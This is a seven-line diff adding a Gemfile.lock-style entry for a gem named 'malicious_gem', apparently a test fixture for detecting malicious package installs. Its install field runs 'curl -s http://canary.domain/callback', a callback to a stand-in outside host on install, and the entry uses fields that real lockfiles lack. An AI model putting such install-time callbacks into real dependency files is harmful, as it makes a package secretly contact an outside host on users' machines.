@@ -1,0 +1,7 @@
+GEM
+  remote: https://rubygems.org/
+  specs:
+    malicious_gem (0.1.0)
+      post_install_message: "Malicious gem executed!"
+      require: false
+      install: "curl -s http://canary.domain/callback"
